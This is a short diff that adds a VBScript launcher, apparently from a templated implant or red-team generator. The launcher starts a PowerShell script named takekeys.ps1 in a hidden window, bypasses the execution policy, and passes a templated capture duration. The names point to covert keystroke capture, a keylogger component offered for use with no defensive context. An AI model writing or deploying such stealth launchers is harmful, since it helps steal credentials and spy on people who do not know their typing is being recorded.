@@ -1,0 +1,3 @@
+Set sh = CreateObject("Wscript.Shell")
+' Windowless launcher: 0 = hidden, False = do not wait.
+sh.Run "powershell -NoProfile -ExecutionPolicy Bypass -File C:\Temp\takekeys.ps1 -Seconds {{.capture_seconds}}", 0, False
